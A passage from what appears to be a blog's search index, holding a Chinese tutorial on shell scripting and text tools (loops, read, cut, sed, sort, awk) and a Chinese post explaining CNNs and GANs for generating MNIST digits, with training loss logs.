值2 值3… do 程序 done 或 for 变量 in 1 2 3; do 程序; done 或 for 变量 in {1..3}; do 程序; done 12345678910111213[root@server1 myshells]# vim for2.sh#!/bim/bash#循环遍历输出集合中每个元素的值#for i in Jack tom marryfor i in $* 或 $@do echo $i是个号人！done[root@server1 myshells]# bash for2.sh Jack是个号人！tom是个号人！marry是个号人！ $@与$*区别（a）$*和$@都表示传递给函数或脚本的所有参数，不被双引号“”包含时，都以$1 $2 …$n的形式输出所有参数。 （b）当它们被双引号“”包含时，“$*”会将所有的参数作为一个整体，以“$1 $2 …$n”的形式输出所有参数；“$@”会将各个参数分开，以“$1” “$2”…”$n”的形式输出所有参数。 12345678910111213141516171819202122232425262728293031323334[root@server1 myshells]# vim qubie.sh#!/bin/bash#$@和$*的区别do echo $i是个好人doneecho 带双引号的'$*'for i in &quot;$*&quot;do echo $i是个好人doneecho 不带双引号的'$@'for i in $@do echo $i是个好人doneecho 不带双引号的'$*'for i in $*do echo $i是个好人done[root@server1 myshells]# bash qubie.sh jack tonny带双引号的$@jack是个好人tonny是个好人带双引号的$*jack tonny是个好人不带双引号的$@jack是个好人tonny是个好人不带双引号的$*jack是个好人tonny是个好人 while1．基本语法 while [ 条件判断式 ] do 程序 done 或 while((表达式)) do ​ 程序 done 2．案例实操 ​ （1）从1加到100 123456789101112131415161718[root@server1 myshells]# touch while.sh[root@server1 myshells]# vim while.sh#!/bin/bashs=0i=1while [ $i -le 100 ]do s=$[$s+$i] i=$[$i+1]doneecho $s[root@server1 myshells]# chmod 777 while.sh [root@server1 myshells]# ./while.sh 5050 ​ （2）从0开始，累加加11次 123456789[root@server1 myshells]# bash test3.sh 11[root@server1 myshells]# cat test3.sh #! /bin/bashNUM=0while((NUM&lt;=10));do let NUM++; doneecho $NUM 系统函数read读取控制台输入 1．基本语法 ​ read(选项)(参数) ​ 选项： -p：指定读取值时的提示符； -t：指定读取值时等待的时间（秒）。 参数 ​ 变量：指定读取值的变量名 2．案例实操 ​ （1）提示7秒内，读取控制台输入的名称 1234567891011[root@server1 myshells]# touch read.sh[root@server1 myshells]# vim read.sh#!/bin/bashread -t 7 -p &quot;Enter your name in 7 seconds &quot; NAMEecho $NAME[root@server1 myshells]# ./read.sh Enter your name in 7 seconds xiaozexiaoze dirname返回最后斜杠之前部分 dirname 文件绝对路径 （功能描述：从给定的包含绝对路径的文件名中去除文件名（非目录的部分），然后返回剩下的路径（目录的部分）） 1234[root@server1 myshells]# dirname /root/myshells/if.sh /root/myshells[root@server1 myshells]# dirname ./if.sh . basename完整路径名 = dirname + / + basename basename [string / pathname] [suffix] （功能描述：basename命令会删掉所有的前缀包括最后一个（‘/’）字符，然后将字符串显示出来。 选项： suffix为后缀，如果suffix被指定了，basename会将pathname或string中的suffix去掉。 12345678[root@server1 myshells]# basename ./if.sh if.sh[root@server1 myshells]# basename /root/myshells/if.sh if.sh[root@server1 myshells]# basename ./if.sh .shif[root@server1 myshells]# basename /root/myshells/if.sh .shif 自定义函数1．基本语法 function funname[()] { ​ Action; ​ [return int;] } funname 2．经验技巧 ​ （1）必须在调用函数地方之前，先声明函数，shell脚本是逐行运行。不会像其它语言一样先编译。 ​ （2）函数返回值，只能通过$?系统变量获得，可以显示加：return返回，如果不加，将以最后一条命令运行结果，作为返回值。return后跟数值n(0-255) 3．案例实操 ​ （1）计算两个输入参数的和 1234567891011121314151617181920[root@server1 myshells]# touch fun.sh[root@server1 myshells]# vim fun.sh#!/bin/bashfunction sum(){ s=0 s=$[ $1 + $2 ] echo &quot;$s&quot;}read -p &quot;Please input the number1: &quot; n1;read -p &quot;Please input the number2: &quot; n2;sum $n1 $n2;[root@server1 myshells]# chmod 777 fun.sh[root@server1 myshells]# ./fun.sh Please input the number1: 2Please input the number2: 57 常用的shell工具wcwc命令用来计算数字。利用wc指令我们可以计算文件的Byte数、字数或是列数，若不指定文件名称，或是所给予的文件名为“-”，则wc指令会从标准输入设备读取数据。 ​ \\1. 基本用法 ​ wc [选项参数] filename ​ \\2. 参数说明 选项参数 功能 -l 统计文件行数 -w 统计文件的单词数 -m 统计文件的字符数 -c 统计文件的字节数 12345678910111213141516[root@server1 myshells]# cat first.sh #! /bin/bash#你好pwdecho hahaha[root@server1 myshells]# wc first.sh 4 6 37 first.sh[root@server1 myshells]# wc -c first.sh 37 first.sh[root@server1 myshells]# wc -m first.sh 33 first.sh[root@server1 myshells]# wc -w first.sh 6 first.sh[root@server1 myshells]# wc -l first.sh 4 first.sh cutcut的工作就是“剪”，具体的说就是在文件中负责剪切数据用的。cut 命令从文件的每一行剪切字节、字符和字段并将这些字节、字符和字段输出。 1.基本用法 cut [选项参数] filename 说明：默认分隔符是制表符 2.选项参数说明 表1-55 选项参数 功能 -f f为fileds，列号，提取第几列 -d d为Descriptor分隔符，按照指定分隔符分割列 3.案例实操 （1）以：为间隔，切割PATH环境变量的第一列 1234[root@server1 myshells]#[root@server1 myshells]# echo $PATH/usr/lib64/qt-3.3/bin:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/opt/jdk1.8.0_121/bin:/root/bin[root@server1 myshells]# echo $PATH | cut -d ':' -f 1/usr/lib64/qt-3.3/bin （2）以：为间隔，切割PATH环境变量的第二、三列 1234[root@server1 myshells]#[root@server1 myshells]# echo $PATH/usr/lib64/qt-3.3/bin:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/opt/jdk1.8.0_121/bin:/root/bin[root@server1 myshells]# echo $PATH | cut -d ':' -f 2,3/usr/local/sbin:/usr/local/bin （3）选取系统PATH变量值，第2个“：”开始后的所有路径： 12345[root@server1 myshells]# echo $PATH/usr/lib64/qt-3.3/bin:/usr/local/bin:/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/sbin:/home/atguigu/bin[root@server1 myshells]# echo $PATH | cut -d: -f 3-/usr/local/bin:/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/sbin:/home/atguigu/bin （4）以：为间隔，切割PATH环境变量的第一到三列，和第五列 1234[root@server1 myshells]# echo $PATH/usr/lib64/qt-3.3/bin:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/opt/jdk1.8.0_121/bin:/root/bin[root@server1 myshells]# echo $PATH | cut -d ':' -f 1-3,5/usr/lib64/qt-3.3/bin:/usr/local/sbin:/usr/local/bin:/bin （5）切割ifconfig 后打印的IP地址 12[root@server1 myshells]# ifconfig eth0 | grep &quot;inet addr&quot; | cut -d: -f 2 | cut -d&quot; &quot; -f1192.168.1.102 sedsed是一种流编辑器，它一次处理一行内容。处理时，把当前处理的行存储在临时缓冲区中，称为“模式空间”，接着用sed命令处理缓冲区中的内容，处理完成后，把缓冲区的内容送往屏幕。接着处理下一行，这样不断重复，直到文件末尾。文件内容并没有改变，除非你使用重定向存储输出。 基本用法 sed [选项参数] ‘command’ filename 选项参数说明 表1-56 选项参数 功能 -e 直接在指令列模式上进行sed的动作编辑。 命令功能描述 表1-57 命令 功能描述 a 新增，a的后面可以接字串，在下一行出现 d 删除 s 查找并替换 案例实操 （0）数据准备 12345678[root@server1 myshells]# touch sed.txt[root@server1 myshells]# vim sed.txtdong shenguan zhenwo wolai laile le （1）将“mei nv”这个单词插入到sed.txt第二行下，打印。 123456789101112131415[root@server1 myshells]# sed '2a mei nv' sed.txt dong shenguan zhenmei nvwo wolai laile le[root@server1 myshells]# cat sed.txt dong shenguan zhenwo wolai laile le 注意：文件并没有改变 （2）删除sed.txt文件所有包含wo的行 123456[root@server1 myshells]# sed '/wo/d' sed.txt dong shenguan zhenlai laile le （3）删除sed.txt文件第二行 123456789101112131415[root@server1 myshells]# cat sed.txt dong shenguan zhenwo wolai laile le[root@server1 myshells]# sed '2d' sed.txt dong shenwo wolai laile le （4）删除sed.txt文件最后一行 12345678910111213141516[root@server1 myshells]# cat sed.txt dong shenguan zhenwo wolai laile le[root@server1 myshells]# sed '$d' sed.txt dong shenguan zhenwo wolai laile le[root@server1 myshells]# （5）删除sed.txt文件第二行至最后一行 12[root@server1 myshells]# sed '2,$d' sed.txt dong shen （6）将sed.txt文件中wo替换为n 123456789[root@server1 myshells]# sed 's/wo/ni/g' sed.txt dong shenguan zhenni nilai laile le[root@server1 myshells]# 注意：‘g’表示global，全部替换，不加g只会替换第一个匹配到的字符。 （4）将sed.txt文件中的第二行删除并将wo替换为ni， 12345678[root@server1 myshells]# sed -e 's/wo/ni/g' -e '2d' sed.txt dong shenni nilai laile le[root@server1 myshells]# sortsort命令是在Linux里非常有用，它将文件进行排序，并将排序结果标准输出。默认情况以第一个字符串的字典顺序来排序！ 基本语法 sort(选项)(参数) 表1-57 选项 说明 -n 依照数值的大小排序 -r 以相反的顺序来排序 -t 设置排序时所用的分隔字符，默认使用TAB -k 指定需要排序的列 -u u为unique的缩写，即如果出现相同的数据，只出现一行 参数：指定待排序的文件列表 案例实操 12345678910111213141516171819202122[root@server1 myshells]# sort -t : -rnk 3 /etc/passwduser01:x:1000:1000::/home/user01:/bin/bashpolkitd:x:999:997:User for polkitd:/:/sbin/nologinchrony:x:998:996::/var/lib/chrony:/sbin/nologinsystemd-network:x:192:192:systemd Network Management:/:/sbin/nologinnobody:x:99:99:Nobody:/:/sbin/nologinpostfix:x:89:89::/var/spool/postfix:/sbin/nologindbus:x:81:81:System message bus:/:/sbin/nologinsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologinapache:x:48:48:Apache:/usr/share/httpd:/sbin/nologinftp:x:14:50:FTP User:/var/ftp:/sbin/nologingames:x:12:100:games:/usr/games:/sbin/nologinoperator:x:11:0:operator:/root:/sbin/nologinmail:x:8:12:mail:/var/spool/mail:/sbin/nologinhalt:x:7:0:halt:/sbin:/sbin/haltshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownsync:x:5:0:sync:/sbin:/bin/synclp:x:4:7:lp:/var/spool/lpd:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinbin:x:1:1:bin:/bin:/sbin/nologinroot:x:0:0:root:/root:/bin/bash awk一个强大的文本分析工具，把文件逐行的读入，以空格为默认分隔符将每行切片，切开的部分再进行分析处理。 基本用法 awk [选项参数] ‘pattern1{action1} pattern2{action2}…’ filename pattern：表示AWK在数据中查找的内容，就是匹配模式 action：在找到匹配内容时所执行的一系列命令 选项参数说明 表1-55 选项参数 功能 -F 指定输入文件折分隔符 -v 赋值一个用户定义变量 案例实操 （0）数据准备 1[root@server1 myshells]# sudo cp /etc/passwd ./ （1）搜索passwd文件以root关键字开头的所有行，并输出该行的第7列。 12[root@server1 myshells]# awk -F: '/^root/{print $7}' passwd /bin/bash （2）搜索passwd文件以root关键字开头的所有行，并输出该行的第1列和第7列，中间以“，”号分割。 12[root@server1 myshells]# awk -F: '/^root/{print $1&quot;,&quot;$7}' passwd root,/bin/bash 注意：只有匹配了patter的行才会执行action （3）只显示/etc/passwd的第一列和第七列，以逗号分割，且在所有行前面添加列名user，shell在最后一行添加”dahaige，/bin/zuishuai”。 1234567[root@server1 myshells]# awk -F : 'BEGIN{print &quot;user, shell&quot;} {print $1&quot;,&quot;$7} END{print &quot;dahaige,/bin/zuishuai&quot;}' passwduser, shellroot,/bin/bashbin,/sbin/nologin。。。atguigu,/bin/bashdahaige,/bin/zuishuai 注意：BEGIN 在所有数据读取行之前执行；END 在所有数据执行之后执行。 （4）将passwd文件中的用户id增加数值1并输出 12345[root@server1 myshells]# awk -v i=1 -F: '{print $3+i}' passwd1234 awk的内置变量 表1-56 变量 说明 FILENAME 文件名 NR 已读的记录数（行号） NF 浏览记录的域的个数（切割后列的个数） 案例实操 （1）统计passwd文件名，每行的行号，每行的列数 1234[root@server1 myshells]# awk -F: '{print &quot;filename:&quot; FILENAME &quot;, linenumber:&quot; NR &quot;,columns:&quot; NF}' passwd filename:passwd, linenumber:1,columns:7filename:passwd, linenumber:2,columns:7filename:passwd, linenumber:3,columns:7 （2）切割IP 12[root@server1 myshells]# ifconfig eth0 | grep &quot;inet addr&quot; | awk -F: '{print $2}' | awk -F &quot; &quot; '{print $1}' 192.168.1.102 （3）查询sed.txt中空行所在的行号 12[root@server1 myshells]# awk '/^$/{print NR}' sed.txt 5","link":"/2021/09/21/shell%E7%BC%96%E7%A8%8B/"},{"title":"基于对抗网络生成数字图像","text":"基于生成对抗网络生成数字图像已知，采用卷积神经网络构建的生成对抗网络会比采用全连接网络的准确率高，所以会按照卷积网络、生成对抗网络、利用对抗网络生成数字图像的顺序进行介绍 参考资料： https://www.jianshu.com/p/1ea2949c0056 https://www.jianshu.com/p/fbcada37ca45 https://www.jianshu.com/p/77627ada2935 Convolutional Neural Networks (LeNet) - DeepLearning 0.1 documentation. DeepLearning 0.1. LISA Lab. [31 August 2013]. https://zhuanlan.zhihu.com/p/33752313 王坤峰，荀超，段艳杰等.生成式对抗网络GAN的研究进展与展望[J].自动化学报.2017 卷积神经网络卷积神经网络的理解： ​ 卷积神经网络的架构 全连接与稀疏连接假设一个神经网络中有m个输入、n个输出。那么对于全连接的矩阵相乘则需要mn个参数。如果输出的连接数被设定为j个，那么采用稀疏连接则只需要jn个参数。在许多情景中，在连接数被设定为j，且j比m要小得多的情况下，机器学习应用的速度获得大幅度的提升，并且仍然能保持较好的效果。 让我们从下图中对比一下全连接与稀疏连接的神经网络。 ​ 全连接的神经网络 ​ 稀疏连接的神经网络 稀疏连接的方法可以使神经网络的连接结构更加简单，同时以更高效的方法来描述变量之间的关系。对比上述两幅图，从输入的角度（自下而上）来看，x3输入在全连接中与所有的输出单元相连接。而在稀疏连接中x3仅仅与s2、s3、s4相连接。 ​ 自上而下从输出看输入 反过来从输出来看输入也是如此。 也许对于卷积网络，其稀疏连接方式的感受野无法设计整个输入，但是当卷积层数增加的时候（深层卷积网络）其单个输出的感受野还是可以涉及到整个输入的。 ​ 多层稀疏连接的感受野 卷积网络通过采用稀疏连接的方法减少了需要存储的参数（权重）的数量，减少了机器学习模型所需要的存储空间，从而提升了模型的统计效率。从计算方面来看，较少的参数数量意味着计算输出时需要更少的参数，从而计算效率也得到大幅提升。 参数共享参数共享是紧接着稀疏连接而来的。在模型中多个函数使用相同的参数则是参数共享。这个共享的参数通常是权重，即共享权重（Shared Weight）。在传统的神经网络中，每个权重被使用一次。而使用共享权重，一个输入位置的参数值也会被应用在其他的输入位置。在卷积网络中，通过参数共享，一个卷积核内的参数会被应用在输入的所有位置。 ​ 参数共享示意图 上图中黑色的箭头表示了在两个不同的模型中使用了特殊参数的连接。上图中，黑色箭头表示在卷积模型中对3个元素核的中间元素的使用。由于参数共享，因此这个单独的参数被用于所有的输入的位置。而在下图中，这个单独的黑色的箭头表示在全连接模型中对权重矩阵的中间元素的使用，下面这个模型没有参数共享，所以参数只使用了一次。 等变表示对于卷积来说，参数共享的特殊形式使得神经网络层具有了对平移等变（Equivariance）的性质。一个函数满足输入改变，那么输出也以同样的方式改变这一个性质，那么这个函数就是等变的。即输入发生变化输出也相应发生同样的变化。 如果f(g(x))=g(f(x))，那么函数f(x)对于变换g具有等变性。在卷积网络中，令g是输入的任意平移函数，那么卷积函数对于g具有等变性。举例，令I表示图像在整数坐标上的亮度函数，g表示图像函数的变换函数，即把一个图像映射到另一个图像函数的函数。令I’=g(I)，图像函数I’满足I’(x,y)=I(x-1,y)。上述函数所做的变换就是将I中的每一个像素均向右移动一个单位。如果先对图像I施加变换，再进行卷积操作f，结果等同于对图像I的卷积施加变换。也就是说，如果图像中的目标发生了一定的位移之后，卷积输出的表达也会产生相同的位移。这个特征对于作用在一个相对小区域的算子十分有用。 卷积网络的经典结构卷积网络的层结构简单的卷积神经网络由一系列不同的层构成，每个层将上一层的一组隐藏层的输出通过一个可微的函数产生一组新的隐藏层的输出。 一个典型的卷积网络有几种不同的层构成： 1、卷积层（Convolutional Layer，CONV） 2、ReLU（Rectified Linear Unit） ReLU(x)=max(0,x) 3、池化层（Pooling Layer，POOL） 4、全连接层（Fully-Connected Layer，FC） 全连接层与普通的神经网络相同。 这些层极其具体的作用如下表所示： 名称 作用 INPUT 输入层：如，以图像的像素的值作为输入 CONV 卷积层：卷积层连接输入的一小块区域，并计算卷积核与之对应的输入区域之间的点乘作为卷积层的输出 ReLU 激活函数：将CONV层中输出的每个元素通过一个非线性激活函数 POOL 池化层：在空间上（Height和Width）执行降采样操作 FC 全连接层：在分类中，将计算每个类别对应的分数，和传统神经网络一样，全连接层的每个神经元与前一层的所有输出相连 上述从INPUT到FC是一个典型的卷积网络的层结构。 CIFAR-10数据集共有60000张彩色图像，这些图像是32*32，分为10个类，每类6000张图。 ​ CIFAR-10数据集示例 以CIFAR-10数据集作为输入来讲解一下卷积网络的各个层的功能： 名称 作用 INPUT 输入层：输入一张大小为32323的3通道RGB图像 CONV 卷积层：如CONV层有12个卷积核，则通过CONV层输出的尺寸为323212 ReLU 激活函数：保持图像的尺寸为323212 POOL 池化层：以22的小窗做降采样操作，特征图的尺寸缩小到1616*12 FC 全连接层：在分类中，输出的尺寸为1110，也就是CIFAR-10中10个类别分别对应的分数 各种卷积网络的结构模式其实，目前很多的卷积网络都是根据一种层级结构的模式进行不同的堆叠。最常见的网络的结构是将 CONV-ReLU堆叠若干遍之后，紧接着一个POOL池化层。然后再重复上述的结构，直到图像在空间上转换成为一个较小的尺寸。最后使用一个全连接层转换为输出。 让我们以一个正则表达式来表示上述的模式： INPUT -&gt; [[CONV -&gt; RELU] * N -&gt; POOL ? ]M -&gt; [FC-&gt;RELU] * K -&gt; FC 其中， N代表重复N次，？代表0或1次，一般来说0&lt;N≤3，M≥0,0&lt;K≤3。 ​ VGGNet (2014) 卷积层的实现卷积层的参数有一组可以学习的卷积核(Kernel)/滤波器（Filter）构成。每个卷积核在空间上是尺寸较小，穿过输入集的整个深度，如下图所示： ​ 一个卷积网络的示意图 卷积网络的第一层的卷积核尺寸通常为333（宽3个像素 高3个像素 深度为通道数是3的RGB图像）或553。在前向传播的过程中，在输入图像上沿着高和宽的方向滑动各个卷积核/滤波器（滤波器是通过向量来表示对输入进行卷积操作的权重），并在所有的位置上面计算卷积核与输入的点乘。当完成沿着宽和高滑动卷积核之后，会得到一个二维的激活映射（Activation Map），这个激活映射也被称为特征映射（Feature Map）或是特征图。特征图的含义是其在每个空间位置上输入对于卷积核的响应。 ​ 滑动卷积核/滤波器得到特征映射 卷积层上的每个卷积核都会生成一个激活特征映射，将这些特征映射沿着深度的方向排列起来并作为卷积层的输出。 比如一个553的滤波器在32323的图像上沿着宽和高滑动，遍历空间内所有的点之后生成的特征图为28281。如果使用3个这样的滤波器/卷积核进行操作之后，将会生成3个28281的特征映射。所以卷积层最终的输出大小为28283。 通过3个滤波器得到的3层特征映射堆叠 在卷积网络中堆叠CONV-RELU这样的结构，卷积核/滤波器的深度要与输入的特征图的深度一致。也就是说，后一个卷积层的卷积核/滤波器大小需要与前一个卷积层输出的维度一致。 ​ 可视化卷积网络 通过观察上述卷积网络的特征图的输出，我们可以发现，随着网络的层数的不断加深，特征图上的响应在表达语义的层面上不断加深。最初的层提取了低层特征（Low-Level Feature），而此后的卷积层在低层特征的基础上产生了具有语义的图形和纹理。最后的卷积层对明确语义的目标产生强烈的响应，也就是说其抽取了图像的高层特征。 卷积层的空间排布在卷积网络中，输出的特征图的尺寸由深度（Depth）、步长（Stride）和零值填充（Zero-Padding）三个超参数决定。 对于输出图的深度这个超参数，其由使用的卷积核/滤波器的数量决定，每个卷积核都负责从输入图像中提取出不同的信息（见下图）。 ​ 不同的卷积操作对应的卷积核以及卷积输出 在卷积网络中对于同一个输入，为了提取不同的特征，需要使用不同的卷积核操作，并且将响应的特征映射堆叠排列起来作为输出。 然后就是滑动卷积核的步长。当滑动卷积核的步长为1的时候，卷积核/滤波器每次移动1个像素的位置。当步长为2的时候，卷积核每次移动2个像素的位置…步长越大，生成的特征映射的空间尺寸就越小。 最后是零值填充。有的时候，为了使用更深的卷积网络，此时则不希望特征映射在卷积的过程中尺寸下降地太快，因此会在输入的边缘使用零值填充来增大输入尺寸。 假设当前卷积层的输入图像尺寸为W、卷积神经元的感受野为F、步长S、边缘零值填充数量为P，则输出特征映射的尺寸为： ​ 经过卷积层的特征图尺寸 数据输入层该层要做的处理主要是对原始图像数据进行预处理，其中包括： 去均值：把输入数据各个维度都中心化为0，如下图所示，其目的就是把样本的中心拉回到坐标系原点上。 归一化：幅度归一化到同样的范围，如下所示，即减少各维度数据取值范围的差异而带来的干扰，比如，我们有两个维度的特征A和B，A范围是0到10，而B范围是0到10000，如果直接使用这两个特征是有问题的，好的做法就是归一化，即A和B的数据都变为0到1的范围。 PCA/白化：用PCA降维；白化是对数据各个特征轴上的幅度归一化 去均值与归一化效果图： 去相关与白化效果图： 把卷积层输出结果做非线性映射。 激活函数有： sigmoid：在两端斜率接近于0，梯度消失。 ReLu：修正线性单元，有可能出现斜率为0，但概率很小，因为mini-batch是一批样本损失求导之和。 TIPS: CNN慎用sigmoid！因为会映射到0-1，和图像的特征不太符合 首先试RELU，因为快，但要小心点。 如果RELU失效，请用 Leaky ReLU或者Maxout。 某些情况下tanh倒是有不错的结果，但是很少。 池化层也叫下采样层，具有特征不变性。 为了减少表达空间的尺寸，卷积网络的连续的卷积层之间往往会周期性地插入池化层。池化层能逐渐减少表达空间的尺寸，降低参数数量和计算开销，并控制卷积网络减少过拟合。 ​ 最大池化图解 在卷积网络中，最常见的池化操作是最大池化（Max Pooling），也就是取视野范围内的最大值。对上图最大池化示意图而言，其输入特征图的尺寸是44，步长为2的池化操作后，得到22的输出特征图。在池化窗口大小是2的是，上图中被分为四种颜色的四个区域，每个区域对应输出特征图的一个像素，对每个窗口取其中的最大值作为输出特征图相应位置的值。 池化窗口的选取通常是2或3，如果窗口大小过大则会对特征图的信息造成破坏。除了最大池化之外，还有平均池化（Average Pooling）和L2-Norm池化。 ​ 特征图池化操作输出的效果 最大池化操作的反向传播形式很简单：将梯度沿着正向传播的过程中最大值的路径向下传递。池化层的正向传递通常会保留最大激活单元下标，作为反向传递时候的传播路径。 CNN的优缺点优点： 共享卷积核，优化计算量。 无需手动选取特征，训练好权重，即得特征。 深层次的网络抽取图像信息丰富，表达效果好。 保持了层级网络结构。 不同层次有不同形式与功能。 缺点： 需要调参，需要大样本量，GPU等硬件依赖。 物理含义不明确。 与NLP/Speech共性： 都存在局部与整体的关系，由低层次的特征经过组合，组成高层次的特征，并且得到不同特征之间的空间相关性。 卷积神经网络之典型CNN结构 LeNet，这是最早用于数字识别的CNN AlexNet， 2012 ILSVRC比赛远超第2名的CNN，比 LeNet更深，用多层小卷积层叠加替换单大卷积层。 ZF Net， 2013 ILSVRC比赛冠军 GoogLeNet， 2014 ILSVRC比赛冠军 VGGNet， 2014 ILSVRC比赛中的模型，图像识别略差于GoogLeNet，但是在很多图像转化学习问题(比如object detection)上效果奇好 卷积神经网络常用的框架Caffe 源于Berkeley的主流CV工具包，支持C++,python,matlab Model Zoo中有大量预训练好的模型供使用 Torch Facebook用的卷积神经网络工具包 通过时域卷积的本地接口，使用非常直观 定义新网络层简单 TensorFlow Google的深度学习框架 TensorBoard可视化很方便 数据和模型并行化好，速度快. 生成对抗网络GANGAN的基本原理GAN 的核心思想来源于博弈论的纳什均衡。它设定参与游戏双方分别为一个生成器(Generator)和一个判别器 (Discriminator), 生成器的目的是尽量去学习真实的数据分布 ,而判别器的目的是尽量正确判别输入数据是来自真实数据还是来自生成器 ;为了取得游戏胜利 , 这两个游戏参与者需要不断优化 ,各自提高自己的生成能力和判别能力 ,这个学习优化过程就是寻找二者之间的一个纳什均衡。GAN的计算流程与结构如图 2 所示。任意可微分的函数都可以用来表示 GAN 的生成器和判别器 由此 ,我们用可微分函数D和 G来分别表示判别器和生成器 ,它们的输入分别为真实数据x和随机变量 z.G(z)则为由G 生成的尽量服从真实数据分布pdata的样本。如果判别器的输入来自真实数据 ,标注为1.如果输入样本为 G(z), 标注为 0. 这里 D 的目标是实现对数据来源的二分类判别 :真 ( 来源于真实数据x 的分布 )或者伪 ( 来源于生成器的伪数据 G(z)),而G的目标是使自己生成的伪数G(z)在D上的表现 D(G(z))和真实数据x在D上的表现 D(x)一致 ,这两个相互对抗并迭代优化的过程使得D和G 的性能不断提升 ,当最终D的判别能力提升到一定程度 ,并且无法正确判别数据来源时 ,可以认为这个生成器G已经学到了真实数据的分布。 手写字的例子来进行进一步窥探GAN的结构。 我们现在拥有大量的手写数字的数据集，我们希望通过GAN生成一些能够以假乱真的手写字图片。主要由如下两个部分组成： 定义一个模型来作为生成器（图中蓝色部分Generator），能够输入一个向量，输出手写数字大小的像素图像。 定义一个分类器来作为判别器（图三中红色部分Discriminator）用来判别图片是真的还是假的（或者说是来自数据集中的还是生成器中生成的），输入为手写图片，输出为判别图片的标签。 训练方法基本流程如下： 训练生成器之后达到（c）样本状态，此时生成器分布相比之前，逼近了真实样本分布。 经过多次反复训练迭代之后，最终希望能够达到（d）状态，生成样本分布拟合于真实样本分布，并且判别器分辨不出样本是生成的还是真实的（判别概率均为0.5）。也就是说我们这个时候就可以生成出非常真实的样本了，目的达到。 训练相关理论包含min，max的公式 判别器在这里是一种分类器，用于区分样本的真伪，因此我们常常使用交叉熵（cross entropy）来进行判别分布的相似性，交叉熵公式如下图所示： Tips: 公式中pi和qi为真实的样本分布和生成器的生成分布。由于交叉熵是非常常见的损失函数，这里默认大家都较为熟悉，就不进行赘述了。 在当前模型的情况下，判别器为一个二分类问题，因此可以对基本交叉熵进行更具体地展开如下图所示： Tips: 其中，假定y1为正确样本分布，那么对应的（1-y1）就是生成样本的分布。D表示判别器，则D(x1)表示判别样本为正确的概率，(1-D(x1)) 则对应着判别为错误样本的概率。这里仅仅是对当前情况下的交叉熵损失的具体化。相信大家也还是比较熟悉。 对于GAN中的样本点 xi ，对应于两个出处，要么来自于真实样本，要么来自于生成器生成的样本 x^ ~G(z) ( 这里的z是服从于投到生成器中噪声的分布)。 其中，对于来自于真实的样本，我们要判别为正确的分布 yi。来自于生成的样本我们要判别其为错误分布（1-yi）。将上面式子进一步使用概率分布的期望形式写出（为了表达无限的样本情况，相当于无限样本求和情况），并且让yi 为 1/2 且使用G(z)表示生成样本可以得到如下图的公式： 现在我们再回过头来对比原本的的minmax公式，发现他们其实就是同一个东西 生成数字图像采用的数据集因为GANS中超参数的设置非常非常麻烦，同样也需要很多的训练epoch。为了加快训练速度，这里使用MNIST数据集，拥有60，000个训练集和10，000测试集。每个图片中包含一个数字（0-9，背景为黑色，数字为白色）。这个数据集通过标准神经网络的训练已经可以达到超过99%的准确率。 这里使用pytorch中自带的数据集工具进行对数据的提取： 原始图像： 随机分布生成的噪声： 定义卷积判别网络： 定义卷积生成网络 定义损失函数 定义优化器 定义训练函数 实验结果： 早期： 最后的结果： 损失值： Iter: 250, D: 1.057, G:2.979 Iter: 500, D: 0.8309, G:1.727 Iter: 750, D: 0.918, G:1.692 Iter: 1000, D: 1.195, G:0.831 Iter: 1250, D: 0.9382, G:1.559 Iter: 1500, D: 1.344, G:1.697 Iter: 1750, D: 1.01, G:1.106 Iter: 2000, D: 1.214, G:1.769 Iter: 2250, D: 0.9676, G:1.234 Iter: 2500, D: 1.056, G:0.9057 Iter: 2750, D: 1.062, G:1.124 Iter: 3000, D: 1.158, G:0.8272 Iter: 3250, D: 0.9431, G:1.994 Iter: 3500, D: 1.112, G:1.288 Iter: 3750, D: 0.9812, G:0.9615 Iter: 4000, D: 1.125, G:1.248 Iter: 4250, D: 0.8623, G:1.461 Iter: 4500, D: 1.029, G:1.31 Iter: 4750, D: 0.8219, G:1.661 Iter: 5000, D: 0.9472, G:1.26 Iter: 5250, D: 0.9054, G:1.3 Iter: 5500, D: 0.8741, G:2.153 Iter: 5750, D: 0.9253, G:1.002 Iter: 6000, D: 0.9568, G:1.278 Iter: 6250, D: 0.9611, G:1.35 Iter: 6500, D: 0.8447, G:1.67 Iter: 6750, D: 0.9014, G:1.341 Iter: 7000, D: 0.9592, G:1.282 Iter: 7250, D: 0.985, G:1.329 Iter: 7500, D: 0.9468, G:1.517 Iter: 7750, D: 1.003, G:1.364 注：以上实验结果是已经得出的较优模型损失值等得出的较好结果 去掉卷积层，实现较为简单的生成对抗网络 改变网络结构为： 初始实验结果： 最终实验结果： 损失值： Iter: 250, D: 1.511, G:0.8354 Iter: 500, D: 1.359, G:0.612 Iter: 750, D: 1.389, G:2.019 Iter: 1000, D: 1.147, G:2.05 Iter: 1250, D: 0.833, G:2.16 Iter: 1500, D: 0.9256, G:1.52 Iter: 1750, D: 1.087, G:1.98 Iter: 2000, D: 0.9269, G:1.244 Iter: 2250, D: 1.108, G:1.061 Iter: 2500, D: 1.057, G:1.093 Iter: 2750, D: 1.115, G:1.932 Iter: 3000, D: 0.9873, G:1.402 Iter: 3250, D: 0.7824, G:1.464 Iter: 3500, D: 0.9784, G:1.319 Iter: 3750, D: 1.112, G:1.123 改变FC层网络结构为：（0&lt;K≤3。） 初始实验结果： 最终实验结果： 损失值： Iter: 250, D: 0.9404, G:1.127 Iter: 500, D: 0.8368, G:1.118 Iter: 750, D: 0.8559, G:0.8823 Iter: 1000, D: 1.018, G:1.133 Iter: 1250, D: 0.8485, G:1.997 Iter: 1500, D: 0.6933, G:1.756 Iter: 1750, D: 0.7199, G:1.98 Iter: 2000, D: 0.7108, G:1.534 Iter: 2250, D: 0.7834, G:2.019 Iter: 2500, D: 0.7777, G:1.758 Iter: 2750, D: 0.8702, G:1.776 Iter: 3000, D: 0.7444, G:1.677 Iter: 3250, D: 0.769, G:1.605 Iter: 3500, D: 1.103, G:1.76 Iter: 3750, D: 0.6795, G:2.354 Iter: 4000, D: 0.7162, G:1.787 Iter: 4250, D: 0.6472, 